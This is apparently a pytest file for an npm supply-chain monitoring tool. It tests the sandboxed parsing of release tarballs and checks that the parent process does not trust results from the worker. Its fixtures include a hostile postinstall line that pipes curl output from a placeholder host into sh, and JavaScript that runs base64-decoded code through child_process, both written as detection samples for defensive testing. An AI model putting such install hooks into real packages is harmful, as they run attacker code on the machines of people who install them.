"""The parsers that read attacker bytes (gzip, tar, JSON, tree-sitter) run in a separate process with no network
and no writes: Seatbelt on macOS, systemd-run on Linux. The parent sends the downloaded tarballs in and gets
plain JSON back, which it checks before trusting."""
import dataclasses
import io
import json
import shutil
import sys
import tarfile
from pathlib import Path

import pytest

from npmdiffwatch import differ, engine, fetcher, orchestrator, sandbox, store
from npmdiffwatch.config import Config
from npmdiffwatch.models import Download, NewRelease

seatbelt = pytest.mark.skipif(sys.platform != "darwin" or not shutil.which("sandbox-exec"),
                              reason="needs macOS sandbox-exec")


def _tgz(members):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members:
            ti = tarfile.TarInfo(name=f"package/{name}"); ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


OLD = [("package.json", b'{"name": "p", "version": "1.0.0"}'), ("lib/a.js", b"module.exports = 1;\n")]
NEW = [("package.json", b'{"name": "p", "version": "1.0.1", "scripts": {"postinstall": "curl -s http://x | sh"}}'),
       ("lib/a.js", b"const cp = require('child_process');\ncp.execSync(Buffer.from(p, 'base64').toString());\n"),
       ("package-lock.json", b'{"packages": {}}')]


def _cfg(tmp_path=None, **kw):
    base = Config(rules_dir=Path("rules/community").resolve(), **kw)
    if tmp_path is not None:
        base = dataclasses.replace(base, db_path=tmp_path / "db.sqlite", lock_path=tmp_path / "l",
                                   cache_dir=tmp_path / "c", reviewer_enabled=False)
    return base


def _download(new=NEW, old=OLD):
    return Download("p", "1.0.1", "1.0.0", False, _tgz(new), _tgz(old),
                    maintainer_metadata={"maintainers": ["a"]}, added_dep_findings=[],
                    scripts_field={"postinstall": "curl -s http://x | sh"})


def _in_process(cfg, dl):
    art = fetcher.extract_download(cfg, dl)
    d = differ.build_diff(art)
    return art, d, engine.triage(d, cfg, orchestrator._load_ruleset(cfg), None)


# ---- the sandbox really denies what it claims ----
@seatbelt
def test_seatbelt_denies_network_writes_and_home_reads():
    assert sandbox.probe(_cfg(), "seatbelt") == {"network": "blocked", "write": "blocked", "home_read": "blocked"}


# ---- results through the sandbox match the in-process scan ----
@seatbelt
def test_sandboxed_scan_matches_the_in_process_scan():
    cfg = _cfg()
    art, d, tr = _in_process(cfg, _download())
    flags, sd, st = sandbox.analyze(cfg, _download(), None, backend="seatbelt")
    assert flags == {"has_lockfile": art.has_lockfile, "has_shrinkwrap": art.has_shrinkwrap}
    assert flags["has_lockfile"] is True
    assert sd == d
    assert (sd._lock_meta, sd._changed_scripts, sd._changed_script_text) == \
           (d._lock_meta, d._changed_scripts, d._changed_script_text)
    assert st == tr and tr.escalate


@seatbelt
def test_a_refused_tarball_is_reported_as_refused_not_as_a_crash():
    with pytest.raises(fetcher.RefusedToExtract, match="members"):
        sandbox.analyze(_cfg(max_members=1), _download(), None, backend="seatbelt")


def test_in_process_backend_gives_the_same_answer():
    cfg = _cfg()
    art, d, tr = _in_process(cfg, _download())
    flags, sd, st = sandbox.analyze(cfg, _download(), None, backend="off")
    assert (sd, st, flags["has_lockfile"]) == (d, tr, art.has_lockfile)


# ---- the parent does not trust what comes back ----
def _good_output():
    cfg = _cfg()
    return cfg, json.loads(json.dumps(sandbox._encode_output(*_in_process(cfg, _download()))))


def test_output_that_is_not_json_is_rejected():
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(b"\x00not json", _cfg(), orchestrator._load_ruleset(_cfg()))


def test_output_with_wrong_types_is_rejected():
    cfg, out = _good_output()
    out["diff"]["changed"][0]["hunks"][0]["added"] = "not a list"
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(json.dumps(out).encode(), cfg, orchestrator._load_ruleset(cfg))


def test_output_naming_a_rule_that_is_not_loaded_is_rejected():
    cfg, out = _good_output()
    out["triage"]["fired_rules"][0]["rule"] = "made-up-rule"
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(json.dumps(out).encode(), cfg, orchestrator._load_ruleset(cfg))


def test_score_and_escalation_are_recomputed_by_the_parent():
    cfg, out = _good_output()
    out["triage"]["score"] = 0.0
    out["triage"]["escalate"] = False
    _, _, tr = sandbox._decode_output(json.dumps(out).encode(), cfg, orchestrator._load_ruleset(cfg))
    assert tr.score == sum(r.weight for r in tr.fired_rules) and tr.escalate


# ---- choosing a sandbox ----
def test_auto_uses_the_platform_sandbox_when_it_passes_the_probe():
    ok = {"network": "blocked", "write": "blocked", "home_read": "blocked"}
    assert sandbox.choose(_cfg(), which=lambda b: True, probe=lambda c, b: ok, platform="darwin") == "seatbelt"
    assert sandbox.choose(_cfg(), which=lambda b: True, probe=lambda c, b: ok, platform="linux") == "systemd"


def test_auto_without_a_working_sandbox_scans_unsandboxed_and_says_so(capsys):
    leaky = {"network": "open", "write": "blocked", "home_read": "blocked"}
    assert sandbox.choose(_cfg(), which=lambda b: True, probe=lambda c, b: leaky, platform="darwin") == "off"
    assert sandbox.choose(_cfg(), which=lambda b: False, probe=None, platform="linux") == "off"
    assert "WARNING" in capsys.readouterr().out


def test_on_refuses_to_scan_without_a_working_sandbox():
    with pytest.raises(sandbox.SandboxError):
        sandbox.choose(_cfg(parse_sandbox="on"), which=lambda b: False, probe=None, platform="linux")


def test_off_never_probes():
    assert sandbox.choose(_cfg(parse_sandbox="off"), which=None, probe=None, platform="darwin") == "off"


def test_systemd_command_denies_network_writes_and_home():
    cmd = " ".join(sandbox._systemd_cmd(_cfg()))
    for prop in ("PrivateNetwork=yes", "ProtectSystem=strict", "ProtectHome=tmpfs", "NoNewPrivileges=yes",
                 "SystemCallFilter=@system-service", "MemoryMax=", "RuntimeMaxSec="):
        assert prop in cmd


# ---- the pipeline uses it ----
@seatbelt
def test_pipeline_scans_a_download_through_the_sandbox(tmp_path, monkeypatch):
    cfg = _cfg(tmp_path)
    monkeypatch.setattr(sandbox, "_backend", "seatbelt")
    conn = store.connect(cfg); store.init_schema(conn)
    rel = NewRelease("p", "1.0.1", 5)
    assert orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), rel, _download())
    stage, score, has_lock = conn.execute("SELECT stage, triage_score, has_lockfile FROM releases").fetchone()
    assert stage == "alerted" and score >= cfg.threshold_t and has_lock   # escalated, no reviewer


def test_download_then_extract_matches_fetch_artifacts(monkeypatch):
    meta = {"versions": {v: {"dist": {"tarball": f"https://registry.npmjs.org/p/-/p-{v}.tgz"},
                             "_npmUser": {"name": "a"}} for v in ("1.0.0", "1.0.1")},
            "time": {"1.0.0": "2026-09-24T05:20:00.000Z", "1.0.1": "2026-09-24T05:49:00.000Z"},
            "maintainers": [{"name": "a"}]}
    blobs = {"1.0.0": _tgz(OLD), "1.0.1": _tgz(NEW)}
    monkeypatch.setattr(fetcher, "_packument", lambda *a: meta)
    monkeypatch.setattr(fetcher, "_fetch_url", lambda url, cfg: blobs[url.rsplit("-", 1)[1][:-4]])
    cfg, rel = Config(), NewRelease("p", "1.0.1", 2)
    assert fetcher.extract_download(cfg, fetcher.download(cfg, rel)) == fetcher.fetch_artifacts(cfg, rel)


# ---- rules that don't read the tarball are evaluated by the parent ----
def _lying_worker(monkeypatch, fired=()):
    """A worker that was taken over by the package it parsed: a well-formed reply claiming nothing fired."""
    cfg = _cfg()
    _, d, _ = _in_process(cfg, _download(new=OLD))
    reply = sandbox._encode_output(fetcher.extract_download(cfg, _download(new=OLD)), d,
                                   dataclasses.replace(engine.triage(d, cfg, []), fired_rules=list(fired)))
    monkeypatch.setattr(sandbox, "_run", lambda cfg, backend, payload: json.dumps(reply).encode())
    return cfg


def test_a_compromised_worker_cannot_hide_ownership_or_dependency_signals(monkeypatch):
    from npmdiffwatch.models import FiredRule
    cfg = _lying_worker(monkeypatch, fired=[FiredRule("publisher-change", 0.0, "<ownership>", (0, 0))])
    dl = dataclasses.replace(_download(), added_dep_findings=[{"name": "lodahs", "reason": "typosquat",
                                                               "target": "lodash"}])
    context = {"current": {"maintainers": ["b"], "publisher_changed": True, "low_footprint_publisher": True},
               "prior": {"maintainers": ["a"]}}
    _, _, tr = sandbox.analyze(cfg, dl, context, backend="seatbelt")
    fired = {r.rule: r.weight for r in tr.fired_rules}
    assert {"dep-typosquat", "maintainer-set-change", "publisher-change", "low-footprint-publisher"} <= set(fired)
    assert fired["publisher-change"] == 25.0            # the parent's weight, not the worker's
    assert [r.rule for r in tr.fired_rules].count("publisher-change") == 1
    assert tr.escalate


def test_worker_results_for_tarball_rules_are_kept(monkeypatch):
    from npmdiffwatch.models import FiredRule
    cfg = _lying_worker(monkeypatch, fired=[FiredRule("js-child-process", 20.0, "lib/a.js", (1, 2))])
    _, _, tr = sandbox.analyze(cfg, _download(), None, backend="seatbelt")
    assert [r.rule for r in tr.fired_rules] == ["js-child-process"] and tr.score == 20.0
